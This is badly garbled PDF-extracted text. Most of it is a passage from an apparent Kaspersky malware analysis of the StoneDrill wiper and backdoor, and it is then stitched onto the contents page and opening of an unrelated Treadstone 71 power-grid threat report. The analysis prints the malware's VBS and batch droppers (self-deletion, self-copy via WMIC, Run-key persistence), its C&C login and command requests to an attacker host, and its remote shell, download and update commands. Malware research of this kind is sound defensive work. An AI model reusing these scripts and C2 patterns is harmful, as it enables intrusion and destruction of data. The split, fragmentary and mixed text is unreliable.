samples. \nParticularly interesting is the heavy use of anti\n-\nemulation techniques in the malware, which \nprevents the automated analysis by\n \nemulators or sandboxes.\n \nOne of the most interesting characteristics is the presence of the Persian language in multiple \nresource sections. \n \n  \nSamples of the StoneDrill malware were uploaded multiple times to multiscanner systems from \nSaudi Arabia between \n27 and 30 November 2016. One StoneDrill victim was also observed in \nthe Kaspersky Security Network (KSN) in Europe.\n \n \n2.4. The StoneDrill wiper\n \nSHA256\n \n62aabce7a5741a9270cddac49cd1d715305c1d0505e620bbeaec6ff9b6fd0260\n \nMD5\n \n0ccc9ec82f1d44c243329014b82d3125\n \nCo\nmpiled\n \n1999.02.08 06:15:47 (GMT) fake, VC 2015\n \nType\n \nI386 GUI EXE\n \nSize\n \n195072 bytes\n \n \nThe malware PE file timestamp is fake\n;\n \nhowever\n,\n \nthe \nauthors forgot to alter a timestamp inside \nthe debug directory. The real timestamp from the debug directory points to: 2016.11.14 \n21:16:45 \n \n \n 1.\n \nThe module highlighted above starts from a heavy anti\n-\nemulation function that contains \nnumerous WinAPI calls with \ninvalid parameters. The goal is to break through the \ndetection of antivirus emulators and heuristic detection. \n \n2.\n \nThe second anti\n-\nemulation technique is run before the payload execution: this module \ncreates a hidden dialog window, then finds and programmatic\n\non that dialog. After that, another series of incorrect WinAPI calls follow.\n \n3.\n \nThe malware then finds the file path of \nthe \ndefault Internet browser app by looking into \nthe following registry keys: \n \na.\n \nSOFTWARE\n\\\nMicrosoft\n\\\nWindows\n\\\nShell\n\\\nAssociations\n\\\nUrlAssociations\n\\\nhttp\n\\\nUs\nerChoice\n \nb.\n \nHKCR\n\\\n%ProgId_val%\n\\\nshell\n\\\nopen\n\\\ncommand\n \n4.\n \nThe malware then checks to ensure the browser is not \nLaunchWinApp.exe \nor is \ncompiled for the 64\n-\nbit architecture, in \nwhich \ncase the path of \n\n%PROGRAM_FILESX86%\n\\\nInternet Expl\norer\n\\\niexplore.exe\n\n \n5.\n \nThe default browser is then started and the wiper module is injected into the running \nbrowser memory. \n \n6.\n \nAfter the successful start of the wiper module, the following script is dropped and \n\n%temp%\n\\\nC\n-\nDlt\n-\nC\n-\nOrg\n-\nT.\n\n \n7.\n \n\n\\\nC\n-\nDlt\n-\nC\n-\nTrsh\n-\nT.tmp\n\nname of the Injector module; this file is deleted after execution is completed.\n \n \nWScript.Sleep(10 * 1000)\n \nOn Error Resume Next\n \nSet WshShell = \nCreateObject(\"Scripting.FileSystemObject\")\n \nWhile WshShell.FileExists(\"%selfname%\")\n \nWshShell.DeleteFile \"%selfname%\"\n \nWend\n \nWScript.Sleep(10 * 1000)\n \nWshShell.DeleteFile \"%temp%\n\\\nC\n-\nDlt\n-\nC\n-\nOrg\n-\nT.vbs\"\n \nSet WshShell = Nothing\n \n%temp%\n\\\nC\n-\nDlt\n-\nC\n-\nOrg\n-\nT.vbs File contents\n \n2.4.1. The StoneDrill Disk Wiper Module\n \nSHA256\n \nbf79622491dc5d572b4cfb7feced055120138df94ffd2b48ca629bb0a77514cc\n \nMD5\n \n697c515a46484be4f9597cb4f39b2959\n \nCompiled\n \n2016.11.14 21:16:40 (GMT), VC 2015\n \nType\n \nI386 GUI EXE\n \nSize\n \n130 560 bytes\n \n \nUnlike Shamoon, the \nStoneDrill disk wiper module is not written onto disk but instead is injected \n\n-\n emulation trick only (clicking the button on the hidden dialog window); it is also\n \nobfuscated with \nthe same alphabet\n-\nbased string encryption. If the browser process privileges do not permit the \nraw disk wiping, only the user\n-\naccessible files are deleted.\n \nDepending on the configuration, this module wipes with random data one of foll\no\nwing\n \npossible \ntargets:\n \n\n\\\n\\\n.\n\\\nPhysicalDrive\n\n\\\n\\\n.\n\\\nX:\n\nWindows\n\nlogical drives\nPlaces a \nspecial emphasis \non \n\nasdhgasdasdwqe%digits%\n\nroot folder of the disk.\nJu\nst \nli\nke \nShamoon\n, \nafte\nr \nth\ne \nwip\ne \nproce\nss \ni\ns \ncompleted\n, \nth\ne \nsyste\nm \ni\ns \nrebooted. \n2.5\n. \nThe StoneDrill backdoor \nAccordin\ng \nt\no \nth\ne \nP\nE \ntimestamp\ns \nfro\nm \nStoneDril\nl \nsampl\ne \ntw\no \nan\nd \nsampl\ne \non\ne \n(2016.10.1\n9 \nand \n2016.11.1\n4 \nrespectively)\n, \nthi\ns \nmalwar\ne \nfil\ne \nwa\ns \ncompile\nd a \nmont\nh \nbefor\ne \nth\ne \npreviously \ndescribe\nd \nStoneDril\nl \nsample\n. \nHowever\n, \ninternall\ny \nthi\ns \ntoo\nl \nwrappe\nr \n(injector\n) \nloo\nks \nli\nke \na \nmore \nmodern \nevolution \nof \nthe \npreviously \ndiscussed \nwiper \nwrapper. \nIs the current user a domain administrator?\nIs the antivirus process currently running?\n2.6. \nThe StoneDrill Installer/Injector module\n \nSHA256\n \n69530d78c86031ce32583c6800f5ffc629acacb18aac4c8bb5b0e915fc4cc4db\n \nMD5\n \nac3c25534c076623192b9381f926ba0d\n \nCompiled\n \n2016.10.19 14:26:01 (GMT), VC 2015\n \nType\n \nI386 GUI EXE\n \nSize\n \n195072 bytes\n \n This module is very similar to \nthe \nabove discussed injector module, utilizing the same set of \nanti\n-\nemulation tricks, injection into \n\nbrowser and \nVBS \nscripts. A distinction in \nthis sample is the wide utilization of the WMI command\n-\nline (\nWMIC) utility to run tasks such as \nrunning the dropped VBS script or \nmaking\n \nregistry modifications.\n \nStrings in this module are encrypted \nin \ntwo \nways: \nAlphabet replacement\nSSE XOR 0x5235\n2.6.2. \nSecond \nstep: \nname \nconstruction\n\n \n\n\n\n\nSet1\n \nIntel, AMD, Microsoft, Windows, Java, \nAdobe, Cisco, SunGard, Query, Location, Power, NFC, DotNet, \nMFC, WMI, SQL, Office, Bitlocker, Map, Fingerprint, Packet, Registery, RAM, CPU, ROM, Memory, \nMonitor, CDROM, Run\n-\ntime, Task, Ethernet, Application, Lockscreen, Cloud, Browser, Cash, Desktop, \nDisp\nlay\n \nSet2\n \nFile, System, Service, Device, Software, Hardware, VM, Network, Performance, Graphic, Engine, Agent, \nData, Wizard, Server, Media, History, Storage, Core, boot, Gaming, Firewall\n \nSet3\n \nManager, Arranger, Controller, Host, Help, Diagnostics, LogOn, \nPlug, Proxy, Events, Transfer, Policy, \nRecovery, Details, Provider, Adapter, CleanUp, Encryption, Extention, APP, Client, Menu, Stub, \nExecute, Luncher, Framework, Tester, Model, Backup, API\n \n\n\\\nC-PDC-C-Cpy-T.vbs\n \nis then dropped in \n%TEMP%\\\n \nOn Error Resume Next\n \nSet WshShell = CreateObject(\"Scripting.FileSystemObject\")\n \nWshShell.CopyFile \"\n%SELF_NAME%\n\" , \"\n%COMMON_APPDATA%\n\\\nChrome\n\\\n%SELECTED_NAME%\n.exe\"\n \nSet WshShell = Nothing\n \nC\n-\nPDC\n-\nC\n-\nCpy\n-\nT.vbs body template\nThe script \nis executed using the following command to do self\n-\ncopy into the \n\n\\\n\n \nfolder:\n \n cmd /c WMIC Process Call Create \"C:\n\\\nWindows\n\\\nSystem32\n\\\nWscript.exe //NOLOGO \n%TEMP%\n\\\nC\n-\nPDC\n-\nC\n-\nCpy\n-\nT.vbs\"\n\nC\n-\nPDI\n-\nC\n-\nCpy\n-\nT.vbs\n\n \ninto %TEMP% folder and executed \nin the same method (via WMIC used to make \na \nsecond malware copy with pathname) \nC:\n\\\nProgramData\n\\\nInternetExplorer\n\\\n%SELECTED_NAME%Stp.exe\n \nOn Error Resume Next\n \nSet WshShell = CreateObject(\"Scripting.FileSystemObject\")\n \nWshShell.CopyFile \"\n%COMMON_APPDATA%\n\\\nChrome\n\\\n%SELECTED_NAME%\n.exe\" , \n\"C:\n\\\nProgramData\n\\\nInternetExplorer\n\\\n%SELECTED_NAME%\nStp.exe\"\n \nC-PDI-C-Cpy-T.vbs body template\nPathname\ns \nof these two VBS file\ns \na\ns \nwell as the initial malware pathname are written into \n%TEMP%\n\\C-Dlt-C-Trsh-T.tmp\n \nfile. \nAt the end of the installation procedure the copy of malware (found in \n\n\\\nChrome\\\n%SELECTED_NAME%\n.exe\n\n\ncmd /c \nwmic process call create\n\n \nthe initial process terminates itself. \n2.6.\n. \n step \n\n\n\\\nChrome\n\nFileInfo.txt\n\n\n\n\n\\\nChrome\\\n%SELECTED_NAME%\n.exe\n \nThen the third copy o\n\n\n%COMSPEC\n% \n/c copy \n\"%SELFNAME\" %TEMP%\\bd891.tmp\n\n \nthe target file to verify if command \nexecution i\ns \nsuccessful, then delete\ns \nthe bd891.tmp file. The last mentioned i\ns \nused a\ns \nanother \nanti-emulation trick in the StoneDrill arsenal. \n2.6.\n. \n step: \nPayload \ninjection \nThe payload i\ns \nextracted from the resources section, decrypted and unpacked similarly to the \npreviously described wiper injector module. The difference here i\ns \nthat for the decryption of the \npayload module, SSE instruction\ns \nare used. \nIn the same style, the payload i\ns \ninjected into the user preferred browser process, with an \nadditional step after the payload module injection: the resource segment responsible for the \npayload configuration i\ns \nreplaced in memory with the resource taken from the parent module. \n After the payload start i\ns \nattempted, the \nV\nBS \nfile\ns \nlisted inside \nC-Dlt-C-Trsh-T.tmp\n \nand \nC-Dlt-\nC-Trsh-T.tmp \nare deleted.\n2.6.\n. \n step: If \nnot \nstarted \nIf the payload i\ns \nnot started, then %TEMP%\\\nC-Dlt-C-Org-T.vbs\n \ni\ns \ndropped and executed to \ndelete initial malware copy. \nWScript.Sleep(10 * 1000)\n \nOn Error Resume Next\n \nSet WshShell = CreateObject(\"Scripting.FileSystemObject\")\n \nWhile WshShell.FileExists(\"\n%initial_malware_pathname%\n\")\n \nWshShell\n.DeleteFile \"\n%initial_malware_pathname%\n\"\n \nWend\n \nWScript.Sleep(10 * 1000)\n \nWshShell.DeleteFile \"\n%TEMP%\n\\\nC\n-\nDlt\n-\nC\n-\nOrg\n-\nT.vbs\"\n \nSet WshShell = Nothing\n \n2.7. StoneDrill \nr\nemote access payload module\n \nSHA256\n \n105ee777ad31a58301310719b49c7b6a7e957823e4dabbfeaa6a14e313008c1b\n \nMD5\n \ne3a82d1db3ae8b189d2e1e0a22d6c82f\n \nCompiled\n \n2016.10.19 16:49:36 (GMT), VC 2015\n \nType\n \nI386 GUI EXE\n \nSize\n \n317 440 bytes\n \nVersion\n \n2.0.1610.76\n \nThis module is not dropped into disk but injected directly into the user preferred browser \nprocess memory. The module is written in C++ with \nthe use of \nSTL classes, with numerous \nforgotten debug strings.\n \n2.7.1. First step: Decryption\n \nStrings in this module\n \nare encrypted by ROR, NEG, ADD or simply XOR. An unreliable anti\n-\nemulation technique is utilized which makes the whole module unstable. The author assumed \nthat the execution of \nthe \nSleep function with parameter 4020 milliseconds \nwould \nincrease the \nsystem \nvalue of KUSER_SHARED_DATA::InterruptTime to \nfour \nseconds (rounded to \nthe \n nearest\n \nsecond). If the InterruptTime \nis \nincreased only by \ntwo \nseconds this module just exits \nimmediately\n. \nIn case of other values, the module will crash due\n \nto the\n \nincorrect \ndecrypt\nion of \nstrings.\n \nThe configuration block is then loaded from resources and decrypted by two passes of XOR.\n \n \nThe \noriginal module configuration resource is empty \n-\n \nthe injector module just patches this \nresource\n,\n \nreplacing the configuration \nwith \nits own. In t\n\nux\n\nuy\n\n \nare \n\nCid\n\nthe \nconnection query and seems to be a client ID.\n \n \n \n  \n2.7.2. Second step: Registering autorun of installer (injector) module\n \nThe malware reads and de\n-\nXORs content of the \nC:\n\\\nProgramD\nata\n\\\nInternetExplorer\n\\\nFileInfoStp.txt\n \nfile, then deletes and unregisters the \nautorun file defined in \nFileInfoStp.txt \n(autorun key deleted from registry) with the command:\n \ncmd /c REG DELETE HKCU\n\\\nSOFTWARE\n\\\nMicrosoft\n\\\nWindows\n\\\nCurrentVersion\n\\\nRun /v Stp /f\n\n \n \nNext, the file \nC:\n\\\nProgramData\n\\\nInternetExplorer\n\\\nFileInfoStp.txt\n \nis deleted and replaced by the \ncommand:\n \ncmd /c Copy /Y \"C:\n\\\nProgramData\n\\\nChrome\n\\\nFileInfo.txt\" \"C:\n\\\nProgramData\n\\\nInternetExplorer\n\\\nFileInfoStp.txt\"\n \n \nThe malware then drops and executes file %TEMP%\n\\\nC\n-\nStrt\n-\nC\n-\nUp\n-\nT.bat\n \nping 1.0.0.0 \n-\nn 1 \n-\nw 20000 > nul\n \n@ECHO OFF\n \nwmic /NameSpace:\n\\\n\\\nroot\n\\\ndefault Class StdRegProv Call SetStringValue hDefKey = \"&H80000001\" \nsSubKeyName = \"Software\n\\\nMicrosoft\n\\\nWindows\n\\\nCurrentVersion\n\\\nRun\" sValue = \n\"C:\n\\\nProgramData\n\\\nInternetExplorer\n\\\n%SELECTED_NAME%\nStp.exe\" sValueName = \"Stp\"\n \nDel \"\n%TEMP%\n\\\nC\n-\nStrt\n-\nC\n-\nUp\n-\nT.bat\"\n \n \n2.7.3. Third step: C&C server selection\n \nMultiple attempts are made to connect to the hosts configured in the \nux\n \nand \nuy\n \nfields\n \n(found in \nthe sample configuration). The malware issue\ns \nGET\n \nrequests to \n\nct_if/ctpublic/Check_Exist.php\n\n \nthe\n \n\nHANW\n-\nJ6YS\n-\nP81J\n-\nKSD7\n\nstring is selected as \nthe \ncurrent live server.\n \nC&C login\n \nThe n\next connection is a login attempt with\n \nthe\n \nfollowing request\n:\n \nPOST\n \n/ HTTP/1.1\n \nHost:\n \nwww.eservic.com\n \nUser\n-\nAgent:\n \nMozilla/5.0 (Windows NT 6.1; rv:23.0) Gecko/20100101 Firefox/23.0\n \nAccept:\n \ntext/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n \nAccept\n-\nLanguage:\n \nen\n-\nUS,en;q=0.5\n \nReferer:\n \nhttp://www.eservic.com/\n \nConnection: \nclose\n \nConten\nt\n-\nType:\n \napplication/x\n-\nwww\n-\nform\n-\nurlencoded\n \nContent\n-\nLength:\n \n96\n \nusername=\nMD5Sum(login)\n&password=\nMD5Sum(password)\n&button=Login\n \n 2.7.4. Fourth step: Get commands list\n \nDuring the fourth step, the malware requests available commands from the C&C\n:\n \nGET \n/insert/index?id=\n%cid_from_config%%random_part_of_client_id%\n&hst=\n%base64encoded_computer_and_user_\nname_cpuid0_checksum%\n&ttype=102&sta\n \nte=201\n \nHTTP/1.1\n \nHost: www.eservic.com\n \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n \nAccept\n-\nLanguage: en\n-\nUS,en;q=0.5\n \nCookie:\n \n%string_received_in_login_step%\n \nConnection: close\n \n \nHere is a list of the StoneDrill commands\n \navailable\n:\n \nCommand\n \nInternal Help Strings\n \nCommand Description\n \nos\n \n1. OS (The is Response the Operating \nSystem of the Client\n \nMachine)\n \nReturn details about Windows version, edition, \narchitecture and environment\n \nversion\n \n2. Version (The Response is Version of \nRunning Product on the Client Machine)\n \n\n2.0.1610.76\n\n \ntime\n \n3. Time (The Response is Current Time of \nthe \nClient Machine)\n \nCurrent system and local time are returned\n \nshell\n \n4. Shell Value (Give You Access the CMD \nConsole in the Client Machine; Value is \nAnything that You Want to Writing in the \nCMD Console of the Client Machine and \nExecute it)\n \nStdout/stderr strea\n\ncmd.exe /C \n\nto CC\n \nscreenshot\n \n5. Screenshot (The Response is a JPEG File \nof the Screenshot of the Client Machine \nDesktop)\n \n1\n-\nAt first the malware takes screenshot into \nrandomly named \n.bmp \nfile in %TEMP% folder. \n \n2\n-\nThen takes second screenshot, now with jpeg \ncompression and store it as \n.jpg\n \nfile with random \nname. In case of success \njpg \ncreation \nbmp\n \nfile is \ndeleted. \n \n3\n-\nSend screenshot file to C&C and delete temporary \nfiles.\n \ndelay\n \n6. Delay \nValue (Adjust the Time\n-\nInterval for \nthe Server and Client Communication; Value \ncan be Between 1000\n-\n100000; 1000 is High\n-\nEnd Speed)\n \n \ndownload\n \n7. Download \"From\" \"To\" (Download a File \nFrom \"a URL\" To \"a Directory on the Client \nMachine\")\n \nDownloaded file init\nially stored as \n\n\\\nTest.tmp\n\n\nC\n-\nDled\n-\nC\n-\nCpy\n-\nT.vbs\n\nthen executed with command:\n \n\"\ncmd /c WMIC Process Call \nCreate \n C:\n\\\nWindows\n\\\nSystem32\n\\\nWscri\npt.exe //\nNOLOGO\n \n \nupload\n \n8. Upload \"From\" (Upload a File From \"a \nDirectory on the Client Machine\")\n \n \nupdate\n \n9. Update \"From\" (Download the New \nVersion of the Product From \"a URL\" and \nExecute it on the Client Machine)\n \nDownloaded file initially stored with random name \ninside %TEMP% folder, then renamed by using \nC\n-\nUptd\n-\nC\n-\nCpy\n-\nT.vbs \nand\n \nC\n-\nUp\n-\nC\n-\nDt\n-\nT.bat \nsimilar to \nprevious steps\n \nuninstall\n \n10. Uninstall (Uninstall The Running Product \nfrom the Client Machine and Delete All Si\nde\n-\nEffects)\n \nUnregister autorun with  command:\n \ncmd /c REG DELETE \nHKCU\n\\\nSOFTWARE\n\\\nMicrosoft\n\\\nWindows\n\\\nCurrentVersion\n\\\nRun \n/v Stp /f\n \nThen drop and run \nC\n-\nUn\n-\nC\n-\nInstl\n-\nT.bat\n \nwith body:\n \nping 1.1.1.1 \n-\nn 5 \n-\nw 2000 > nul\n \nRMDIR /S /Q \"C:\n\\\nProgramData\n\\\nChrome\n\\\n\"\n \nRMDIR /S /Q \n\"C:\n\\\nProgramData\n\\\nInternetExplorer\n\\\n\"\n \nDel \"\n%TEMP%\n\\\nC\n-\nUn\n-\nC\n-\nInstl\n-\nT.bat\"\n \nThen terminates itself.\n \nantivirus\n \n11. Antivirus (The Response is Installed \nAntivirus on the Client Machine)\n \nQueries Windows Management Instrumentation \n(WMI) database for installed\n \nAntiVirusProduct\n \ndetails. Runs additional registry \nlookups for details of: \nAvast\n, \nMcAfee\n, \nAvg\n, \nBitDefender\n \nproducts.\n \nhelp\n \n12. Help (Response is the List of Supported \nCommands in the Current Version of Product \nthat Running on the Client Machine)\n \nList title\n \nis \n\"\n-\nCommand List of the Current \nVesrion are:\"\n \n \n2.8. StoneDrill \ns\nimilarities with Shamoon \n \nOf course, one of the most important questions is the following: are StoneDrill and Shamoon \nconnected? This is a difficult question to answer\n.\n \nH\nowever, by listing the similarities and \ndifferences between the two, \nany\none can come up with their own answer.\n \nAlthough we used a Yara built on Shamoon samples to find StoneDrill, there are several other \nsimilarities between the two: \n \n\n \nBoth Shamoon and \nStoneDril appear to be targeting Saudi organizations.\n \n\n \nSamples have been compiled around the same time \n-\n \nOctober\n-\nNovember 2016.\n \n\n \nSimilar to previous generations of Shamoon, StoneDrill uses encrypted PE resources to \nstore the actual payload. \n \n \n \n The m\nost impor\ntant differences include:\n \n\n \nTo avoid detection by emulators and sandboxing tools, the StoneDrill authors used \nfar \nmore advanced anti\n-\nemulation techniques than Shamoon.\n \n\n \nStoneDrill utilises VBS scripts to run self\n-\n\ne\nxternal scripts.\n \n\n \nA distinction from the Shamoon malware is that the strings encryption in StoneDrill is \nperformed by alphabet table replacement.\n \n\n \nStoneDrill does not use drivers during deployment, but rather through memory injection \n\nred browser.\n \n \n2.9. StoneDrill \ns\nimilarities with News\nB\neef\n \n\n-\n \nNews\nB\neef. While we call \nthis \nthe News\nB\neef APT, this group has been reported in the past as \nCharmin\ng Kitten or Newscaster \n(\nin 2014\n)\n.\n \nThe similarities between News\nB\neef and StoneDrill make us believe there is a \nvery \nstrong \nconnection there. Below we list some of the similarities we observed:\n \n \n2.9.1. Winmain Signature\n \n \nIn NewsBeef:\n \nB8 08 00 FE 7F FF 30 8F \n44 24 20 68 B4 0F 00 00 FF 15 78 70 44 00 B8 08 00 FE 7F FF 30 8F 44 24 24 8B 4C \n24 24 2B 4C 24 20 B8 6B CA 5F 6B F7 E1 C1 EA 16 80 EA 02 88 15 95 71 45 00\n \nIn StoneDrill:\n \nB8 08 00 FE 7F FF 30 8F 44 24 14 68 B4 0F 00 00 FF 15 4C B0 63 00 B8 08 00 FE 7F FF \n30 8F 44 24 10 8B 44 \n24 10 33 D2 2B 44 24 14 B9 80 96 98 00 F7 F1 2C 02 A2 61 D6 64 00\n \n \n \n 2.9.2. The OS command\n \nIn News\nB\neef:\n \n \n \n \nIn StoneDrill:\n \n \nIn StoneDrill\n \n 2.9.3. The Update command\n \n \nIn News\nB\neef:\n \n \nIn StoneDrill:\n \n \n \n2.9.4. The Strings Decryption \nroutine\n \n \nIn News\nB\neef:\n \n \n \nIn StoneDrill:\n \n \n 2.9.5. The Payload Winmain\n \n \nIn News\nB\neef:\n \n \n \nIn StoneDrill:\n \n \n \n2.9.6. Command center name similarities\n \nBesides the technical code similarities listed above, we noticed that the naming scheme for \nthe \nNews\nB\neef and Sto\nneDrill C&Cs is quite similar. For instance:\n \n \nStoneDrill\n \nNewsBeef\n \nwww.chromup[.]com\n \nwww.chrome\n-\nup[.]date\n \nservice1.chrome\n-\nup[.]date\n \nservice.chrome\n-\nup[.]date\n \nwww.eservic[.]com\n \nwww.serveirc[.]com\n \n 3. Conclusions\n \nOur discovery of StoneDrill gives another \ndimension to the existing wave of wiper attacks \nagainst Saudi organizations that started with Shamoon 2.0 in November 2016. Compared to the \nnew Shamoon 2.0 variants, the most significant difference is the lack of a disk driver used for \ndirect access during\n \nthe destructive step. Nevertheless, one does not necessarily need raw disk \naccess to perform destructive functions at file level, which the malware implements quite \nsuccessfully.\n \nOf course, one of the most important questions here is the connection betwee\nn Shamoon and \nStoneDrill. Both wipers appear to have been used against Saudi organizations during a similar \ntimeframe of October\n-\nNovember 2016. Several theories are possible here:\n \n\n \nStoneDrill is a less\n-\nused wiper tool\n,\n \ndeployed in certain situations by the same Shamoon \ngroup\n.\n  \n \n\n \nStoneDrill and Shamoon are used by different groups which are aligned in their interests\n.\n \n\n \nStoneDrill and Shamoon are used by two different groups which have no connection to \neach other and just h\nappen to target Saudi organizations at the same time\n.\n \n \nTaking all factors into account, our opinion is\n \nthat\n \nthe most likely theory is the second. \n \nAdditionally, StoneDrill appears to be connected with previously reported News\nB\neef activity, \nwhich continues \nto target Saudi organizations. From this point of view, News\nB\neef and StoneDrill \nappear to be \ncontinuously \nfocused \non targeting Saudi interests, while Shamoon is a flashy, \ncome\n-\nand\n-\ngo high impact tool.\n \nIn terms of attribution, while Shamoon embeds Arabic\n-\nYe\nmen resource language sections, \nStoneDrill embeds mostly Persian resource language sections. Geopolitical analysts would be \nquick to point out that Iran and Yemen are both players in the Iran\n-\nSaudi Arabia \nproxy conflict\n. \nOf course, we do not exclude \nthe possibility of false flags.\n \nFinally, many unanswered question remain in regards to StoneDrill and News\nB\neef. The \ndiscovery of the StoneDrill wiper in Europe is a significan\nt sign\n \nthat\n \nthe group is expanding \nits \ndestructive attacks outside the Middle East. The target for the attack appears to be a large \ncorporation with a wide area of activity in the petro\n-\nchemical sector, with no apparent \nconnection or interest in Saudi Arab\nia.\n \nAs usual, we will continue to monitor the Shamoon, StoneDrill and News\nB\neef attacks. A \npresentation about StoneDrill will be given at the Kaspersky Security Analyst Summit \nConference, on April 2\n-\n6, 2017.\n \n \nKaspersky Lab products detect the Shamoon and St\noneDrill samples as:\n \nTrojan.Win32.EraseMBR.a\n \nTrojan.Win32.Shamoon.a\n \n Trojan.Win64.Shamoon.a\n \nTrojan.Win64.Shamoon.b\n \nBackdoor.Win32.RemoteConnection.d\n \nTrojan.Win32.Inject.wmyv\n \nTrojan.Win32.Inject.wmyt\n \nHEUR:Trojan.Win32.Generic\n \n 4.Appendices\n4.1. Indicators \nof Compromise\n \n4.1.1. Shamoon MD5s\n \n00c417425a73db5a315d23fac8cb353f\n \n271554cff73c3843b9282951f2ea7509\n \n2cd0a5f1e9bcce6807e57ec8477d222a\n \n33a63f09e0962313285c0f0fb654ae11\n \n38f3bed2635857dc385c5d569bbc88ac\n \n41f8cd9ac3fb6b1771177e5770537518\n \n5446f46d89124462ae7aca4fce420423\n \n548f6b23799f9265c01feefc6d86a5d3\n \n63443027d7b30ef0582778f1c11f36f3\n \n6a7bff614a1c2fd2901a5bd1d878be59\n \n6bebb161bc45080200a204f0a1d6fc08\n \n7772ce23c23f28596145656855fd02fc\n \n7946788b175e299415ad9059da03b1b2\n \n7edd88dd4511a7d5bcb91f2ff\n177d29d\n \n7f399a3362c4a33b5a58e94b8631a3d5\n \n8405aa3d86a22301ae62057d818b6b68\n \n8712cea8b5e3ce0073330fd425d34416\n \n8fbe990c2d493f58a2afa2b746e49c86\n \n940cee0d5985960b4ed265a859a7c169\n \n9d40d04d64f26a30da893b7a30da04eb\n \naae531a922d9cca9ddca3d98be09f9df\n \nac8636b6ad8f946e1\nd756cd4b1ed866d\n \naf053352fe1a02ba8010ec7524670ed9\n \nb4ddab362a20578dc6ca0bc8cc8ab986\n \nbaa9862b027abd61b3e19941e40b1b2d\n \nc843046e54b755ec63ccb09d0a689674\n \nd30cfa003ebfcd4d7c659a73a8dce11e\n \nda3d900f8b090c705e8256e1193a18ec\n \n dc79867623b7929fd055d94456be8ba0\n \nec010868e\n3e4c47239bf720738e058e3\n \nefab909e4d089b8f5a73e0b363f471c1\n \n4.1.2. StoneDrill MD5s\n \nac3c25534c076623192b9381f926ba0d\n \n0ccc9ec82f1d44c243329014b82d3125\n \n8e67f4c98754a2373a49eaf53425d79a\n \nfb21f3cea1aa051ba2a45e75d46b98b8\n \n4.1.3. StoneDrill C2s\n \nwww.eservic[.]com\n \nwww.securityupdated[.]com\n \nwww.actdire[.]com\n \nwww.chromup[.]com\n \nwww.chrome\n-\nup[.]date\n \nservice1.chrome\n-\nup[.]date\n \nservice.chrome\n-\nup[.]date\n \nwww.serveirc[.]com\n \n ", "Intelligence\n \nGames\n \ni\nn\n \nthe\n \nPower\n \nG\nrid \nTreadstone 71 \n\n Contents\n \nIntelligence Games in the Power Grid\n \n................................................................................................\n....................................\n 1\n \nAnalytic Review\n \n................................................................................................\n...................................................................\n 4\n \nDelta Ele\nktronics highly likely supported by the Russian government and a direct threat to energy sector supply \nchain operations\n \n................................................................................................\n.............................................................\n 4\n \nNarrati\nve Overview \n\u0152 \nSupporting Information\n \n.......................................................................................................................\n 6\n \nChronology of Russian Attacks\n \n................................................................................................\n................................................\n 7\n \nBlackEnergy\n \n................................................................................................\n.............................................................................\n 9\n \nStep  1:  Reconnaissance and Intelligence Gathering\n \n.........................................................................................................\n 9\n \nS\ntep 2:  Malware Development and Weaponization\n \n........................................................................................................\n \n10\n \nStep 3:  Deliver Remote Access Trojan (RAT)\n \n....................................................................................................................\n \n10\n \nStep 4: Adversaries install BlackEnergy 3\n \n..........................................................................................................................\n \n10\n \nStep 5:  Establish CC Connection\n \n................................................................................................\n.......................................\n \n11\n \nStep 6:  Deliver Malw\nare Plugins\n \n................................................................................................\n......................................\n \n11\n \nStep 7: Harvest Credentials\n \n................................................................................................\n...............................................\n \n11\n \nStep 8: Lateral Movement and Target Identification on Corporate Network\n \n..................................................................\n \n12\n \nStep 9: Lateral Movement and Target Identification on ICS network\n \n..............................................................................\n \n12\n \nStep \n1\n0: Develop Malicious \nC\nomputer \nC\node \n....................................................................................................................\n \n13\n \nS\ntep 11:  Deliver Data Destruction Malware\n \n....................................................................................................................\n \n13\n \nStep 12:  Schedule Uninterruptable Power Supply (UPS) Disruption\n \n...............................................................................\n \n13\n \nStep 13: Trip Breakers\n \n................................................................................................\n.......................................................\n \n14\n \nStep 14:  Sever Connection to Field Devices\n \n.....................................................................................................................\n \n14\n \nStep 15:  Telephony Denial\n-\nof\n-\nService Attack\n \n...................................................................................................................\n \n14\n \nStep 16: \n \nDisable Critical Systems via UPS Outage\n \n............................................................................................................\n \n15\n \nStep 17:  Destroy Critical System Data\n \n..............................................................................................................................\n \n15\n \nDragonFly\n \n................................................................................................\n..............................................................................\n \n16\n \nBackground\n \n................................................................................................\n.......................................................................\n \n16\n \nTools employed\n \n................................................................................................\n................................................................\n. \n17\n \nMultiple attack vectors\n \n................................................................................................\n.....................................................\n \n17\n \nTrojanized software\n \n................................................................................................\n..........................................................\n \n18\n \nDelta Elektronics\n \n................................\n................................................................................................\n...................................\n \n19\n \nIntelligence/Reconnaissance: \n................................................................................................\n...........................................\n \n19\n \nOGRN\n \n................................................................................................\n.................................................................................\n \n19\n \nDelta Elektronics and Dragonfly?\n \n................................................................................................\n......................................\n \n20\n \nRaw data and information review\n \n................................................................................................\n................................\n \n20\n \nGaps and Assumptions\n \n................................................................................................\n..................................................\n \n22\n \n Ana\nlysis of Competing Hypotheses I\n \n................................................................................................\n................................\n. \n25\n \nAnalysis of Competi\nng Hypotheses II\n \n................................................................................................\n................................\n \n26\n \nIn Summary\n \n................................................................................................\n...........................................................................\n \n28\n \nBibliography\n \n................................................................................................\n..........................................................................\n \n29\n \n Analytic Review \nDelta\n El\nektronics\n hi\nghly\n \nlikely\n s\nupported\n by\n the\n Russian\n go\nvernment and\n a\n di\nrect threat to\n ene\nrgy\n s\nector\n s\nupply\n \nchain\n ope\nrations\n \nThe \nt\neam \na\nsserts \nw\nit\nh \nmoderate \nc\nonfidence that \nD\nelta \nE\nlektronics \n(\nDE) is \nlik\nely a \nf\nront \nc\nompany directly associated with \nEnergetic\n B\near\n (\nDragonfly),\n a\nnd\n \nthe\n e\nquipment\n p\nurchased\n f\nrom\n D\nE\n i\ns\n v\nulnerable to\n s\nupply\n \nchain\n \nthreats\n \ndue\n t\no\n ma\nlware \nembedded\n i\nn\n t\nhe\n Ta\niwanese \nDelta \nElectronics \n(T-DE) \nprogrammable \nlogic \ncontroller \n(PLC) \nsoftware\n\n.  T-D\nE\n i\ns\n n\not\n aw\nare\n o\nf\n \nthe \ninfections \nallowing \ncustomers \nto download and install \ninfected \nPLC \nsoftware \nfor \nthe \ninitial \npurposes \nof \ncyber \nespionage. Long term\n i\nntentions\n i\nnclude\n \npossible physical\n s\nabotage\n \noperations. The PLCs \na\nppear\n t\no\n b\ne\n 